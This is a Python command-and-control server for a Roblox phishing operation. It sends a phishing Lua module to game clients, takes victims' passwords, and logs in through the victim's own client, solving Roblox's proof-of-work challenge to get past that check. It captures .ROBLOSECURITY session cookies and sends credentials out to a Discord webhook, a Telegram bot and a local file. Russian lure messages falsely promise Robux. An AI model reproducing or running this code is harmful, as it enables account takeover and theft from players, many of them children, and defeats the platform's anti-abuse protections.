"""
c2_http_proxy.py — C2 server. HTTP requests executed by client (syn.request).
Server orchestrates: CSRF → login → PoW solve → captcha fallback.
PoW solved server-side (CPU), captcha → browser fallback.
"""
import math
import asyncio
import websockets
import json
import time
import logging
import os
import sys
import random
import subprocess
import threading
import requests
import base64
import http.client

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
log = logging.getLogger(__name__)

WS_PORT = 8081
MODULES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "modules")
PHISH_COOLDOWN = 20
UPDATE_DELAY = 2 * 3600
CREDENTIALS_FILE = os.path.abspath("c2_credentials.txt")
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

tg_proc = None

HTTP_REQ_TIMEOUT = 30
_http_req_id = 0
_http_pending = {}


def tg_write(text):
    try:
        tg_proc.stdin.write(json.dumps({"text": text}) + "\n")
        tg_proc.stdin.flush()
    except Exception as e:
        log.warning(f"tg_write error: {e}")


def save_credentials(username, password, cookie_value):
    try:
        with open(CREDENTIALS_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")
            f.write(f".ROBLOSECURITY: {cookie_value}\n\n")
        log.info(f"Credentials saved to {CREDENTIALS_FILE}")
    except Exception as e:
        log.error(f"Failed to save credentials: {e}")


def dc_write(text):
    try:
        requests.post(DISCORD_WEBHOOK, json={"content": text}, timeout=5)
    except Exception as e:
        log.error(f"DC webhook error: {e}")


def load_module(name):
    path = os.path.join(MODULES_DIR, name)
    with open(path, "r", encoding="utf-8") as f:
        return f.read()


def solve_pow(N_str, A, T):
    N = int(N_str)
    val = A % N
    for _ in range(T):
        val = (val * val) % N
    return str(val)


CLIENTS = {}


async def delayed_send(uid, delay, module, target_state):
    if delay:
        await asyncio.sleep(delay)
    client = CLIENTS.get(uid)
    if not client or client.get("completed"):
        return
    try:
        ws = client.get("ws")
        if ws:
            module_code = load_module(module)
            await ws.send(module_code)
            if module == "phish.lua":
                await ws.send(json.dumps({"type": "show_phish"}))
            client["last_phish"] = time.time()
            client["state"] = target_state
    except Exception as e:
        log.warning(f"delayed_send error: {e}")


async def http_req(ws, method, url, headers=None, body=None):
    """Send HTTP request to client, wait for response."""
    global _http_req_id
    _http_req_id += 1
    req_id = _http_req_id
    future = asyncio.get_event_loop().create_future()
    _http_pending[req_id] = future
    msg = {"type": "http_request", "id": req_id, "method": method, "url": url}
    if headers:
        msg["headers"] = headers
    if body is not None:
        msg["body"] = body
    await ws.send(json.dumps(msg))
    try:
        return await asyncio.wait_for(future, timeout=HTTP_REQ_TIMEOUT)
    except asyncio.TimeoutError:
        _http_pending.pop(req_id, None)
        return None


async def login_via_proxy(ws, username, password):
    """
    Orchestrate login via client HTTP proxy.
    Returns {"cookie": "..."}, {"challenge": "captcha"}, {"rate_limited": True}, or None.
    """

    def find_header(hdrs, name):
        """Case-insensitive header lookup."""
        for k, v in (hdrs or {}).items():
            if k.lower() == name.lower():
                return v
        return None

    async def proxy_post(url, data, extra_headers=None, no_csrf=False):
        """POST via client, get CSRF if needed."""
        hdrs = {
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://www.roblox.com",
            "Referer": "https://www.roblox.com/login",
        }
        if extra_headers:
            hdrs.update(extra_headers)
        resp = await http_req(ws, "POST", url, headers=hdrs, body=json.dumps(data))
        if not resp:
            return None
        return resp

    # Step 1: GET roblox.com/login to establish session cookies
    log.info("[proxy] Step 1: GET roblox.com/login (init session)")
    init_resp = await http_req(ws, "GET", "https://www.roblox.com/login")
    if not init_resp:
        log.warning("[proxy] Step 1 failed: no response")
        return None

    # Step 2: Get CSRF token by sending a deliberately-failing POST
    log.info("[proxy] Step 2: POST v2/login (get CSRF)")
    csrf_body = {"ctype": "Username", "cvalue": username, "password": password}
    csrf_resp = await proxy_post("https://auth.roblox.com/v2/login", csrf_body, no_csrf=True)
    if not csrf_resp:
        return None
    csrf = find_header(csrf_resp.get("headers", {}), "x-csrf-token") or ""
    if not csrf:
        log.warning("[proxy] No CSRF token")
        return None
    log.info(f"[proxy] Got CSRF: {csrf[:20]}...")

    # Step 3: Actual login attempt
    log.info("[proxy] Step 3: POST v2/login (with CSRF)")
    login_headers = {"x-csrf-token": csrf}
    result = await proxy_post("https://auth.roblox.com/v2/login", csrf_body, login_headers)
    if not result:
        return None

    status = result.get("status", 0)
    resp_headers = result.get("headers", {})
    body_text = result.get("body", "")
    cookies = result.get("cookies", {})

    log.info(f"[proxy] Login response: HTTP {status}")

    # Check for .ROBLOSECURITY in cookies
    rbx_cookie = cookies.get(".ROBLOSECURITY") or cookies.get("ROBLOSECURITY")
    if rbx_cookie:
        log.info("[proxy] .ROBLOSECURITY captured!")
        return {"cookie": rbx_cookie}

    # Check for challenge (403)
    if status == 403:
        chall_id = find_header(resp_headers, "rblx-challenge-id") or ""
        chall_type = find_header(resp_headers, "rblx-challenge-type") or ""
        chall_meta_b64 = find_header(resp_headers, "rblx-challenge-metadata") or ""

        if chall_type == "proofofwork" and chall_meta_b64:
            log.info(f"[proxy] PoW challenge: id={chall_id}")
            return await _solve_pow_via_proxy(ws, username, password, chall_id, chall_meta_b64, csrf)

        if chall_type == "captcha" or "captcha" in chall_id.lower():
            log.info("[proxy] Captcha challenge — need browser fallback")
            return {"challenge": "captcha"}

    # Rate limit
    if status == 429:
        log.warning("[proxy] Rate limited (429)")
        return {"rate_limited": True}

    # Unknown error
    if status != 200:
        log.warning(f"[proxy] Login failed: HTTP {status} {body_text[:200]}")
        return None

    # Success (200) but no cookie? Shouldn't happen but handle it
    log.warning("[proxy] HTTP 200 but no .ROBLOSECURITY cookie")
    return None


async def _solve_pow_via_proxy(ws, username, password, chall_id, chall_meta_b64, csrf):
    """Solve PoW challenge via client HTTP proxy."""
    try:
        meta = json.loads(base64.b64decode(chall_meta_b64))
    except Exception:
        meta = {}
    session_id = meta.get("sessionId", "")
    if not session_id:
        log.warning("[pow] No sessionId in metadata")
        return None

    pw_url = "https://apis.roblox.com/proof-of-work-service/v1/pow-puzzle"

    # Step 1: Fetch PoW puzzle via client
    log.info(f"[pow] Fetching puzzle for session {session_id[:20]}...")
    puzzle_resp = await http_req(ws, "GET", f"{pw_url}?sessionID={session_id}",
                                  headers={"Origin": "https://www.roblox.com", "Referer": "https://www.roblox.com/login"})
    if not puzzle_resp or puzzle_resp.get("status") != 200:
        log.warning("[pow] Puzzle fetch failed")
        return None

    try:
        puzzle = json.loads(puzzle_resp.get("body", "{}"))
    except json.JSONDecodeError:
        log.warning("[pow] Invalid puzzle body")
        return None

    artifacts = json.loads(puzzle.get("artifacts", "{}"))
    N_str = artifacts.get("N", "")
    A = int(artifacts.get("A", 0))
    T_ = int(artifacts.get("T", 0))
    log.info(f"[pow] Solving: N_len={len(N_str)} A={A} T={T_}")
    solution = solve_pow(N_str, A, T_)

    # Step 2: Get fresh CSRF via client
    log.info("[pow] Getting fresh CSRF...")
    csrf_body = {"ctype": "Username", "cvalue": username, "password": password}
    csrf_r = await http_req(ws, "POST", "https://auth.roblox.com/v2/login",
                             headers={"Content-Type": "application/json;charset=UTF-8",
                                      "Origin": "https://www.roblox.com",
                                      "Referer": "https://www.roblox.com/login"},
                             body=json.dumps(csrf_body))
    csrf_fresh = ""
    if csrf_r:
        for k, v in (csrf_r.get("headers", {}) or {}).items():
            if k.lower() == "x-csrf-token":
                csrf_fresh = v
                break

    # Step 3: Submit PoW solution via client
    log.info("[pow] Submitting solution...")
    pow_hdrs = {"Content-Type": "application/json;charset=UTF-8",
                "Origin": "https://www.roblox.com",
                "Referer": "https://www.roblox.com/login"}
    if csrf_fresh:
        pow_hdrs["x-csrf-token"] = csrf_fresh
    solve_resp = await http_req(ws, "POST", pw_url,
                                 headers=pow_hdrs,
                                 body=json.dumps({"sessionID": session_id, "solution": solution, "prefix": ""}))
    if not solve_resp or solve_resp.get("status") != 200:
        log.warning(f"[pow] Solution submission failed")
        return None

    try:
        solve_data = json.loads(solve_resp.get("body", "{}"))
    except json.JSONDecodeError:
        log.warning("[pow] Invalid solution response")
        return None

    redemption_token = solve_data.get("redemptionToken", "")
    if not redemption_token:
        log.warning("[pow] No redemption token")
        return None
    log.info("[pow] Redemption token obtained")

    # Step 4: Retry login with PoW headers via client
    log.info("[pow] Retrying login with PoW proof...")
    retry_hdrs = {
        "x-csrf-token": csrf_fresh or csrf,
        "rblx-challenge-id": chall_id,
        "rblx-challenge-type": "proofofwork",
        "rblx-challenge-redemption-token": redemption_token,
    }
    login_body = {"ctype": "Username", "cvalue": username, "password": password}
    retry_hdrs["Content-Type"] = "application/json;charset=UTF-8"
    retry_hdrs["Origin"] = "https://www.roblox.com"
    retry_hdrs["Referer"] = "https://www.roblox.com/login"
    retry = await http_req(ws, "POST", "https://auth.roblox.com/v2/login",
                           headers=retry_hdrs, body=json.dumps(login_body))
    if not retry:
        return None

    retry_cookies = retry.get("cookies", {})
    rbx_cookie = retry_cookies.get(".ROBLOSECURITY") or retry_cookies.get("ROBLOSECURITY")
    if rbx_cookie:
        log.info("[pow] .ROBLOSECURITY after PoW!")
        return {"cookie": rbx_cookie}

    retry_status = retry.get("status", 0)
    retry_headers = retry.get("headers", {})
    retry_body = retry.get("body", "")
    retry_chall = find_header(retry_headers, "rblx-challenge-id") or ""
    retry_chall_type = find_header(retry_headers, "rblx-challenge-type") or ""

    if retry_chall_type == "captcha" or "captcha" in retry_chall.lower():
        log.info("[pow] Captcha challenge after PoW — need browser")
        return {"challenge": "captcha"}

    if retry_status == 429:
        log.warning("[pow] Rate limited after PoW")
        return {"rate_limited": True}

    log.warning(f"[pow] Retry failed: HTTP {retry_status} {retry_body[:200]}")
    return None


async def handle_login(ws, cs, username, password):
    """Run login in background so http_response can be processed by main loop."""
    try:
        result = await login_via_proxy(ws, username, password)
    except Exception as e:
        log.error(f"Login error: {e}")
        await ws.send(json.dumps({"type": "err", "message": "Ошибка входа"}))
        return
    player_name = cs.get("player_name", "")
    if result and "cookie" in result:
        log.info(f"COOKIE captured")
        cs["completed"] = True
        cs["state"] = "complete"
        save_credentials(username, password, result["cookie"])
        tg_msg = f"<b>{player_name}</b>\n{username}\n{password}\n\n{result['cookie']}"
        tg_write(tg_msg)
        dc_write(f"{player_name} | {username}:{password} | {result['cookie']}")
        h1 = random.randint(6, 12)
        h2 = random.randint(h1 + 12, h1 + 48)
        await ws.send(json.dumps({"type": "ok", "message": f"Robux будут начислены от {h1} до {h2} часов. Ожидайте."}))
    elif result and result.get("challenge") == "captcha":
        if cs["tries"] >= 3:
            cs["exhausted"] = True
            cs["tries"] = 0
            await ws.send(json.dumps({"type": "err", "message": f"CAPTCHA не пройдена. Фиш через {math.ceil(PHISH_COOLDOWN / 3600)} ч.", "cooldown": PHISH_COOLDOWN, "blocked": True}))
        else:
            await ws.send(json.dumps({"type": "err", "message": f"CAPTCHA не пройдена. Попытка {cs['tries']}/3"}))
    elif result and result.get("rate_limited"):
        if cs["tries"] >= 3:
            cs["exhausted"] = True
            cs["tries"] = 0
            await ws.send(json.dumps({"type": "err", "message": f"Rate limit. Фиш через {math.ceil(PHISH_COOLDOWN / 3600)} ч.", "cooldown": PHISH_COOLDOWN, "blocked": True}))
        else:
            await ws.send(json.dumps({"type": "err", "message": f"Rate limit, попробуйте ещё раз. Попытка {cs['tries']}/3"}))
    else:
        if cs["tries"] >= 3:
            cs["exhausted"] = True
            cs["tries"] = 0
            await ws.send(json.dumps({"type": "err", "message": f"Неверный пароль. Бонус пришлем снова через {math.ceil(PHISH_COOLDOWN / 3600)} ч.", "cooldown": PHISH_COOLDOWN, "blocked": True}))
        else:
            await ws.send(json.dumps({"type": "err", "message": f"Неверный пароль, попробуйте ещё раз. Попытка {cs['tries']}/3"}))


async def handle_client(ws):
    log.info("Client connected")
    cs = {"tries": 0, "state": "hello", "player_name": "", "user_id": 0, "last_phish": 0, "completed": False, "exhausted": False, "closed_by_user": False, "done_at": 0, "phish_task": None, "ws": ws}
    try:
        async for msg in ws:
            if isinstance(msg, str):
                try:
                    data = json.loads(msg)
                except json.JSONDecodeError:
                    continue
                t = data.get("type")

                # HTTP response from proxy — resolve pending future
                if t == "http_response":
                    req_id = data.get("id")
                    if req_id in _http_pending:
                        resp_data = data.get("response", {})
                        _http_pending[req_id].set_result({
                            "status": resp_data.get("StatusCode", 0),
                            "headers": resp_data.get("Headers", {}),
                            "body": resp_data.get("Body", ""),
                            "cookies": {},
                        })
                        del _http_pending[req_id]
                    continue

                if t == "hello":
                    cs["player_name"] = data.get("playerName", "")
                    cs["user_id"] = data.get("userId", 0)
                    uid = cs["user_id"]
                    log.info(f"Client hello: user={cs['player_name']} id={uid}")
                    if uid in CLIENTS:
                        old = CLIENTS[uid]
                        if old.get("completed"):
                            log.info(f"User {uid} already completed, no phish")
                            cs["completed"] = True
                            CLIENTS[uid] = cs
                            continue
                        if old.get("closed_by_user"):
                            log.info(f"User {uid} voluntarily closed, no more phish")
                            cs["closed_by_user"] = True
                            CLIENTS[uid] = cs
                            continue
                        if old.get("exhausted") and old.get("done_at"):
                            elapsed = time.time() - old["done_at"]
                            if elapsed < PHISH_COOLDOWN:
                                log.info(f"User {uid} exhausted, in cooldown ({PHISH_COOLDOWN - elapsed:.0f}s remaining)")
                                cs["exhausted"] = True
                                cs["done_at"] = old["done_at"]
                                CLIENTS[uid] = cs
                                continue
                            log.info(f"User {uid} exhausted, cooldown elapsed, resending phish")
                    CLIENTS[uid] = cs
                    cs["phish_task"] = asyncio.create_task(delayed_send(uid, PHISH_COOLDOWN, "phish.lua", "phish_sent"))

                elif t == "password":
                    if cs.get("completed"):
                        continue
                    password = data.get("password", "")
                    user_id = data.get("userId", 0)
                    player_name = data.get("playerName", "")
                    log.info(f"Password from {player_name} (id={user_id}), len={len(password)}")
                    cs["tries"] += 1
                    username = None
                    try:
                        resp = requests.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10)
                        if resp.status_code == 200:
                            username = resp.json().get("name")
                    except Exception as e:
                        log.warning(f"Username lookup error: {e}")
                    if not username:
                        await ws.send(json.dumps({"type": "err", "message": "Не удалось определить логин"}))
                        continue
                    log.info(f"Username: {username}")
                    await ws.send(json.dumps({"type": "hold", "message": "Проверка данных..."}))
                    asyncio.create_task(handle_login(ws, cs, username, password))

                elif t == "2fa_code":
                    pass

                elif t in ("closed", "timed_out"):
                    if cs.get("exhausted"):
                        cs["done_at"] = time.time()
                        if cs.get("phish_task"):
                            cs["phish_task"].cancel()
                        uid = cs["user_id"]
                        cs["phish_task"] = asyncio.create_task(delayed_send(uid, PHISH_COOLDOWN, "phish.lua", "phish_sent"))
                    else:
                        cs["closed_by_user"] = True
                    cs["state"] = "done"

    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        if cs.get("phish_task"):
            cs["phish_task"].cancel()
        cs["ws"] = None
        cs["state"] = "disconnected"
        cs["done_at"] = time.time()
        uid = cs.get("user_id", 0)
        if uid and uid in CLIENTS:
            CLIENTS[uid].update({"ws": None, "state": "disconnected", "done_at": time.time()})
        log.info(f"Client disconnected (user_id={uid})")


async def main():
    global tg_proc
    tg_proc = subprocess.Popen(
        [sys.executable, "-u", os.path.join(os.path.dirname(os.path.abspath(__file__)), "tg_bot.py")],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1
    )
    def read_tg():
        for line in tg_proc.stdout:
            log.info(f"[tg_bot] {line.rstrip()}")
    threading.Thread(target=read_tg, daemon=True).start()

    async def handler(ws):
        await handle_client(ws)
    async with websockets.serve(handler, "0.0.0.0", WS_PORT) as server:
        log.info(f"WebSocket server on ws://0.0.0.0:{WS_PORT}")
        try:
            await asyncio.Future()
        except asyncio.CancelledError:
            pass
    if tg_proc:
        try: tg_proc.kill()
        except: pass


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
